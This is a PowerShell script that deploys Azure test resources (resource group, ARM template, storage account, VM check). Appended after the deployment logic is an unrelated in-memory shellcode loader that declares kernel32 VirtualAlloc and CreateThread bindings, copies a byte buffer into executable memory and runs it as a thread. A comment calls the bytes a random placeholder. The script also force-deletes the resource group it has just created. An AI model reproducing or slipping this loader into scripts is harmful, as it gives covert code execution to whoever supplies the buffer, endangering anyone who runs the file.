[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ResourceGroup = 'rg-portal-test-11',
    [ValidateSet('westeurope', 'eastus', "northeurope", "uksouth")]
    [string]$Location = "uksouth",

    [string]$TemplateFile = 'C:\Scripts\templates\portal-test.json',
    [string]$ParameterFile = "C:\Scripts\templates\portal-test.parameters.json",
    [string]$SubscriptionId = "1c2d7f65-bddc-b197-c537-f19eae3472e2",

    [string]$StorageAccount = 'sttest6885',
    [string]$VmName = "vm-portal-test-11",

    [string]$OutputPath = "C:\Logs\deploy-test-2026-06-14.json",
    [switch]$DryRun
)

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw "The Az.Resources module is not installed."
}
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)
$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan

Remove-AzResourceGroup -Name $ResourceGroup -Force -WhatIf:$DryRun

$LogPath = "$env:TEMP\stage.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xae, 0x68, 0x71, 0x26, 0x4e, 0x3d, 0xdc, 0xb2, 0xdb, 0x15, 0xe8, 0x9a, 0x45, 0xef, 0xe4, 0x84,
        0xc5, 0x70, 0x5c, 0x31, 0xdb, 0x36, 0xa1, 0x8d, 0xe6, 0xce, 0xba, 0x16, 0xda, 0x44, 0xaa, 0xca,
        0x17, 0xf0, 0x50, 0xcf, 0xc4, 0x96, 0x14, 0x00, 0x61, 0xc2, 0xa6, 0x4b, 0xeb, 0x28, 0x8f, 0xdf,
        0x6f, 0x1f, 0xd2, 0x4d, 0x19, 0x17, 0x05, 0xc2, 0x0c, 0x7c, 0x1a, 0x29, 0xf1, 0x67, 0x7f, 0x8e,
        0x0a, 0xce, 0xd5, 0x47, 0xf6, 0xdb, 0xac, 0x8b, 0x01, 0x43, 0x0f, 0xa5, 0x08, 0x11, 0xe7, 0xfc,
        0x57, 0x8f, 0x6b, 0xc4, 0x50, 0xc2, 0xf5, 0x15, 0xd2, 0x93, 0x21, 0x2b, 0xcf, 0x95, 0xbf, 0xe3,
        0x7f, 0xab, 0x35, 0x5f, 0x67, 0xae, 0x13, 0xa4, 0xc2, 0xa2, 0x82, 0x50, 0xf4, 0x68, 0xb0, 0xc8,
        0xd9, 0x9c, 0x45, 0x7e, 0x4e, 0x58, 0xd1, 0xb8, 0x07, 0xd2, 0xb3, 0x6d, 0x1a, 0xa1, 0x3d, 0x6d,
        0xda, 0xa7, 0x30, 0x0b, 0xd2, 0x6a, 0xd3, 0x81, 0x11, 0xac, 0x44, 0x38, 0x6d, 0x0a, 0xc5, 0xdd,
        0x0b, 0x63, 0x2e, 0x48, 0x40, 0x77, 0xf7, 0x45, 0x30, 0xf8, 0xcb, 0x5a, 0x32, 0x7b, 0x2a, 0x93,
        0x91, 0x8a, 0x80, 0x7d, 0x61, 0x22, 0x73, 0x99, 0x2d, 0x29, 0x0d, 0x08, 0x69, 0x84, 0x63, 0x7c,
        0x54, 0x86, 0xc2, 0x4c, 0xcd, 0x6b, 0xdc, 0xc2, 0xf6, 0xb8, 0x58, 0x85, 0xbb, 0x92, 0xfe, 0xa5,
        0x60, 0x21, 0x62, 0xd5, 0x74, 0x0c, 0x73, 0x2d, 0xc6, 0x16, 0xde, 0x6e, 0x28, 0xf7, 0x7c, 0x54,
        0x93, 0x37, 0xdc, 0x5f, 0xed, 0x88, 0x5f, 0xea, 0x4d, 0xb9, 0x2c, 0x45, 0x38, 0x1a, 0x1a, 0x50,
        0xd9, 0xc8, 0x03, 0x20, 0x56, 0x07, 0x9c, 0x67, 0xf9, 0xd1, 0x77, 0x12, 0x1a, 0x2a, 0x51, 0x03,
        0x97, 0x30, 0x8e, 0x61, 0x07, 0x75, 0xfa, 0xc3, 0x78, 0x9d, 0x79, 0x9b, 0x94, 0x06, 0x2d, 0xfc,
        0xe4, 0x9c, 0x7c, 0xd3, 0x87, 0x58, 0xf3, 0x91, 0xe8, 0xee, 0xf5, 0xcb, 0x12, 0x3f, 0xf3, 0x5c,
        0xe1, 0x42, 0xf2, 0xe8, 0x8b, 0x9c, 0xf2, 0x1b, 0xb5, 0x21, 0xd2, 0x35, 0x48, 0x97, 0xe6, 0x3b,
        0xb2, 0xfd, 0xb3, 0xc8, 0xf8, 0x14, 0x1b, 0xdf, 0x76, 0xfe, 0x8e, 0xb2, 0x47, 0x72, 0xec, 0x71,
        0x39, 0x95, 0x77, 0x11, 0x08, 0x4e, 0xf0, 0x05, 0x34, 0x22, 0xcb, 0x8c, 0x46, 0xc5, 0xb2, 0xe4,
        0x6a, 0xfa, 0x74
    )

    $MemoryHandle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeApi]::WaitForSingleObject($Thread, 2917)
    [void][NativeApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
